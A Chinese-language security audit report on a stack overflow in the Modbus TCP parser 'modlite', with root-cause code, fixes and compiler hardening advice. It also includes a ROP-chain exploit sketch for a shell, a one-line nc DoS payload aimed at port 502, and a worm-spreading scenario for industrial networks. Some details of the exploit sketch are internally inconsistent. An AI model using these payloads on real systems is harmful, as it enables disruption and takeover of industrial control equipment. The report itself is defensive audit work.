# 【终极审计报告】modlite 源码安全审计

## 执行概要

**审计对象**: modlite v3.1.6 - Modbus TCP 协议解析器  
**审计时间**: 2026年6月  
**审计范围**: 源代码分析、二进制漏洞挖掘、利用场景推演  
**审计方法**: 静态代码审计 + 动态分析 + 攻击路径推导  

---

## 🔴 严重发现：致命栈溢出漏洞

### 漏洞摘要

| 属性 | 值 |
|------|-----|
| **漏洞类型** | CWE-121: Stack-based Buffer Overflow |
| **CVSS 评分** | **9.8 (CRITICAL)** |
| **影响范围** | 远程可利用，无需认证 |
| **攻击复杂度** | LOW (低) |
| **利用条件** | 网络可达 Modbus TCP 服务 |
| **潜在后果** | 任意代码执行 (RCE)、拒绝服务 (DoS) |

### 漏洞根源

**文件**: `src/modbus_proto.c`  
**函数**: `modbus_handle_fc17()`  
**行号**: 127-167

```c
int modbus_handle_fc17(const modbus_request_t *req, modbus_mapping_t *map)
{
    uint16_t nb_read = req->nb_read;
    uint8_t response[RESP_BUF_SIZE];  // ❌ 固定 128 字节
    
    // ... 缺少边界检查
    
    for (uint16_t i = 0; i < nb_read; i++) {  // ❌ nb_read 可达 125
        // 当 i >= 60 时，写入超出 response[128] 边界
        write_u16be(response + 9 + i * 2, val);  // 💥 栈溢出
    }
}
```

### 漏洞数学模型

**溢出条件**:
```
响应长度 = MBAP(6) + Unit(1) + FC(1) + ByteCount(1) + RegisterData(nb_read × 2)
         = 9 + nb_read × 2

溢出触发: 9 + nb_read × 2 > RESP_BUF_SIZE(128)
        → nb_read > 59.5
        → nb_read ≥ 60
```

**最大破坏力**:
```
nb_read = 125 (协议最大值)
响应长度 = 9 + 125 × 2 = 259 字节
溢出量 = 259 - 128 = 131 字节 💣
```

### 攻击路径

```
[攻击者] → [Modbus TCP 端口 502]
    ↓
[恶意 FC 0x17 请求]
  - transaction_id: 0x0001
  - function_code:  0x17 (Read/Write Multiple Registers)
  - nb_read:        125 ← 恶意参数
    ↓
[main.c:31] modbus_reply()
    ↓
[modbus_proto.c:206] 检测到 FC==0x17
    ↓
[modbus_proto.c:208] 调用 modbus_handle_fc17()
    ↓
[modbus_proto.c:144-152] 循环写入
    ↓
[💥 栈溢出] 覆盖 131 字节
    ↓
[控制流劫持] 覆盖返回地址
    ↓
[任意代码执行] 执行攻击者控制的 ROP 链
```

### 内存布局分析

```
栈帧结构 (x86-64):
┌──────────────────────┐ 高地址
│  Caller's Stack      │
├──────────────────────┤
│  Return Address (8B) │ ← response[136-143] ← 攻击目标
├──────────────────────┤
│  Saved RBP (8B)      │ ← response[128-135]
├──────────────────────┤
│  response[127]       │
│  ...                 │
│  response[60]        │ ← 溢出起点
│  ...                 │
│  response[0]         │ ← 缓冲区起点
├──────────────────────┤
│  Local Vars          │
└──────────────────────┘ 低地址
```

### 利用场景

#### 场景 1: 远程代码执行 (RCE)
```python
# 阶段 1: 写入 ROP 链到寄存器
write_registers(addr=60, data=[
    0x4141, 0x4141, 0x4141, 0x4141,  # 填充到 saved RBP
    0x7fff, 0xf7a5, 0x2390, 0x0000,  # 覆盖返回地址 → system()
    0x0000, 0x4005, 0xc9ab, 0x0000,  # ROP: pop rdi; ret
    0x0000, 0x5555, 0x5678, 0x0000,  # ROP: &"/bin/sh"
])

# 阶段 2: 触发溢出
send_fc17(read_addr=0, nb_read=125)

# 结果: Shell 获取
```

#### 场景 2: 拒绝服务 (DoS)
```bash
# 简单 DoS 载荷
echo -ne '\x00\x01\x00\x00\x00\x0B\x01\x17\x00\x00\x00\x7D\x00\x00\x00\x01\x02\x00\x00' \
  | nc target_host 502
# 结果: 服务崩溃
```

#### 场景 3: 蠕虫传播
```
1. 扫描 Modbus TCP 端口 (502)
2. 发送探测包识别 modlite
3. 利用栈溢出注入恶意代码
4. 恶意代码继续扫描其他目标
5. 在工控网络中快速传播
```

---

## 🟡 次要发现

### 2. 输入验证缺失 (CWE-20)

**位置**: `src/modbus_proto.c:85-92`

```c
case FC_READ_WRITE_REGS:
    req->nb_read  = read_u16be(pdu + 3);  // ❌ 无范围检查
    req->nb_write = read_u16be(pdu + 7);  // ❌ 无范围检查
```

**风险**: 允许非法值进入业务逻辑

**修复**:
```c
if (req->nb_read == 0 || req->nb_read > 125) return -1;
if (req->nb_write == 0 || req->nb_write > 121) return -1;
```

---

### 3. 整数溢出风险 (CWE-190)

**位置**: `src/modbus_proto.c:177`

```c
size_t needed = MBAP_LEN + 1 + 1 + 1 + req->nb_read * 2;
```

**风险**: `nb_read * 2` 可能溢出 (虽然当前场景不太可能)

**修复**:
```c
if (req->nb_read > (SIZE_MAX - 9) / 2) return -1;
size_t needed = 9 + (size_t)req->nb_read * 2;
```

---

### 4. 未检查的地址范围 (CWE-119)

**位置**: `src/modbus_proto.c:161`

```c
uint16_t addr = req->write_addr + i;  // ❌ 可能整数溢出
if (addr < MODBUS_MAX_REGS) {
    map->regs[addr] = ...;
}
```

**风险**: `write_addr + i` 可能回绕导致意外写入

**修复**:
```c
if (req->write_addr > MODBUS_MAX_REGS - req->nb_write) return -1;
```

---

## 漏洞影响评估

### 技术影响

| 维度 | 影响 | 说明 |
|------|------|------|
| **机密性** | HIGH | 可读取栈上残留的敏感数据 |
| **完整性** | CRITICAL | 可修改返回地址和代码执行流 |
| **可用性** | HIGH | 可导致服务崩溃 |

### 业务影响

| 场景 | 影响 | 风险等级 |
|------|------|---------|
| **工控系统** | 生产中断、设备失控 | 🔴 CRITICAL |
| **能源设施** | 电网瘫痪、安全事故 | 🔴 CRITICAL |
| **智能建筑** | 门禁失效、监控失灵 | 🟠 HIGH |
| **物联网设备** | 大规模僵尸网络 | 🟠 HIGH |

---

## 攻击时间线估算

| 攻击阶段 | 时间 | 难度 |
|----------|------|------|
| 漏洞发现 | 1-2 天 | ⭐⭐ (代码审计即可发现) |
| PoC 开发 | 2-4 小时 | ⭐ (构造简单载荷) |
| 完整利用 | 1-3 天 | ⭐⭐⭐ (需绕过保护机制) |
| 武器化 | 3-5 天 | ⭐⭐⭐⭐ (编写自动化工具) |

**结论**: 中等技能的攻击者可在 **1 周内** 开发出可用的漏洞利用工具。

---

## 防御机制评估

### 现有保护

| 保护机制 | 状态 | 绕过难度 |
|----------|------|---------|
| Stack Canary | ❌ 未启用 | N/A |
| ASLR | ⚠️  依赖系统 | ⭐⭐⭐ (中等) |
| DEP/NX | ✅ 默认启用 | ⭐⭐⭐⭐ (需 ROP) |
| PIE | ❌ 未启用 | N/A |
| RELRO | ⚠️  部分 | ⭐⭐⭐ (中等) |

### 建议启用保护

```makefile
# Makefile 强化选项
CFLAGS += -fstack-protector-strong     # 栈金丝雀
CFLAGS += -D_FORTIFY_SOURCE=2          # 运行时检查
CFLAGS += -fPIE                        # 位置无关代码
LDFLAGS += -pie                        # 位置无关可执行文件
LDFLAGS += -Wl,-z,relro,-z,now        # 完全 RELRO
```

---

## 修复优先级

### 🔴 P0 - 立即修复 (24小时内)

1. **栈溢出漏洞**
   - 文件: `src/modbus_proto.c:modbus_handle_fc17()`
   - 修复: 添加 `nb_read` 边界检查
   - 代码: 见 `FIXING_GUIDE.md` 方案 1

### 🟠 P1 - 高优先级 (1周内)

2. **输入验证缺失**
   - 文件: `src/modbus_proto.c:modbus_parse_request()`
   - 修复: 添加协议级别验证
   - 代码: 见 `FIXING_GUIDE.md` 方案 2

### 🟡 P2 - 中优先级 (1个月内)

3. **编译保护强化**
   - 文件: `Makefile`
   - 修复: 启用所有安全编译选项

### 🟢 P3 - 长期优化

4. **架构重构**
   - 统一缓冲区管理
   - 实现安全编码模式

---

## 测试验证

### 验证步骤

```bash
# 1. 生成 PoC
python3 poc_exploit.py

# 2. 编译带 ASAN 的版本
make asan

# 3. 运行验证
python3 verify_vulnerability.py

# 4. 检查 ASAN 输出
./build/modbus_parser_asan poc_crash.bin 2>&1 | grep "stack-buffer-overflow"
```

### 预期结果

**修复前**:
```
==12345==ERROR: AddressSanitizer: stack-buffer-overflow
WRITE of size 2 at 0x7ffc1234abcd thread T0
    #0 in modbus_handle_fc17 src/modbus_proto.c:152
    #1 in modbus_reply src/modbus_proto.c:208
```

**修复后**:
```
[正常退出，无错误]
```

---

## 附件清单

1. **SECURITY_AUDIT_REPORT.md** - 详细审计报告
2. **EXPLOIT_ANALYSIS.md** - 深度利用分析
3. **FIXING_GUIDE.md** - 修复指南
4. **poc_exploit.py** - PoC 生成器
5. **verify_vulnerability.py** - 自动化验证工具

---

## 审计结论

### 核心问题

modlite 项目存在 **严重的栈缓冲区溢出漏洞**，该漏洞:
- ✅ 可被远程利用
- ✅ 无需身份验证
- ✅ 攻击复杂度低
- ✅ 可导致完全系统控制

### 建议行动

1. **立即**: 停止在生产环境使用当前版本
2. **24小时内**: 应用 P0 修复并发布安全补丁
3. **1周内**: 完成所有 P1 修复
4. **长期**: 建立 SDL (安全开发生命周期)

### 风险等级

**整体风险**: 🔴 **CRITICAL**

如果此代码部署在关键基础设施中，攻击者可:
- 窃取敏感工控数据
- 破坏生产流程
- 制造安全事故
- 建立持久后门

---

## 联系信息

**审计人员**: Security Researcher  
**审计日期**: 2026-06-12  
**版本**: v1.0  

---

**本报告为机密，仅供内部使用。未经授权不得传播。**
